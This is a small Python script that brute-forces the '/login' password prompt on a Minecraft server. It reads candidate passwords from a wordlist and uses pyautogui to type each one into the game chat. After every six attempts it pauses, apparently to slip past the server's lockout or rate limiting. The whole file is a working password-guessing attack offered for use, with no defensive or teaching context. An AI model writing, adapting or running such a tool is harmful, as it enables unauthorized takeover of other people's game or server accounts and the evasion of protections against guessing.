import pyautogui
import time as t

cooldownTime = 9

count = 0
# file open, file read
with open(input("bruteforce file name: "), 'r') as f:
	password = f.read().strip().split("\n")
	print(password)
	print("waiting 5 seconds (go to minecraft window)")
	t.sleep(5)

# bruteforce start
for p in password:
	print("try:	", p)
	pyautogui.press('t')
	pyautogui.typewrite("/login " + p)
	pyautogui.press('enter')
	count += 0.5
	if count % 3 == 0: # "if (6 tries to input password): reconnect"
		count = 0
		print("**cooldown**")
		t.sleep(cooldownTime)